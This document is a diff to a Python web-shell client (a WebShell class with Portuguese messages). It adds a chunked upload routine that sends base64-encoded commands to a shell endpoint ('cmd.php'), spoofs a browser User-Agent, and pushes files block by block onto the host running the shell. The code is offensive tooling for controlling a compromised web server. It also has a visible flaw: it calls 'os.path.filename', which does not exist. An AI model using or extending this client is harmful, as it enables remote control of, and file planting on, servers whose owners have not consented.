@@ -127,12 +127,77 @@ class WebShell:
 		except requests.exceptions.ConnectionError as e:
 			raise WebShellCMDError(e)
 
-	def _uploadinblocks(self, file, dest, blocksize=1024):
-		with open(file, 'rb') as file:
+	def _uploadinblocks(self, filename, dest, blocksize=1024):
+
+		def startupload(this, filename):
+			try:
+				res = this.session.post(this.endpoint, data={
+					'a': base64.b64encode('start-upload {}'.format(filename).encode()).decode()
+				}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'}, allow_redirects=False)
+
+				if res.status_code != 200:
+					try:
+						return base64.b64decode(res.content).decode()
+					except:
+						return res.text
+
+				return True
+			except requests.exceptions.ConnectionError as e:
+				raise WebShellCMDError(e)
+
+
+		def uploadblock(this, block):
+			try:
+				res = this.session.post(this.endpoint, data={
+					'a': base64.b64encode('upload-block {}'.format(block).encode()).decode()
+				}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'}, allow_redirects=False)
+
+				if res.status_code != 200:
+					try:
+						return (False, base64.b64decode(res.content).decode())
+					except:
+						return (False, res.text)
+
+				return (True, '')
+
+			except requests.exceptions.ConnectionError as e:
+				return (False, e)
+
+		def finishupload(this):
+			try:
+				res = this.session.post(this.endpoint, data={
+					'a': base64.b64encode(b'stop-upload').decode()
+				}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'}, allow_redirects=False)
+				try:
+					return (res.status_code == 201, base64.b64decode(res.content).decode())
+				except:
+					return (res.status_code == 201, res.text)
+
+			except requests.exceptions.ConnectionError as e:
+				raise WebShellCMDError(e)
+
+		with open(filename, 'rb') as file:
+			r = startupload(self, dest)
+			if r != True:
+				return r
+
 			encoded = base64.b64encode(file.read()).decode()
 			size = len(encoded)
 			k = size // blocksize + int(size % blocksize != 0)
-			i =
+			i = 0
+			for j in tqdm(range(0, k)):
+				ret, msg = uploadblock(self, encoded[i:i+blocksize])
+				if not ret:
+					print(msg)
+
+				i += blocksize
+
+			print()
+			ret, msg = finishupload(self)
+			return msg
+
+		return "Não foi possível abrir o arquivo '{}'".format(filename)
+
 
 	def _input(self):
 		return input('\033[1;31m{}\033[37m:\033[1;34m{}\033[37m$ '.format(self.user, self.path)).strip()
@@ -220,7 +285,7 @@ class localCMDs:
 		if args[1].endswith('/'):
 			args[1] += os.path.filename(args[0])
 
-		return this.uploadinblocks(args[0], args[1], args[2])
+		return this._uploadinblocks(args[0], args[1], args[2])
 
 def main():
 	ws = WebShell('admin', 'admin', 'http://localhost/cmd.php')
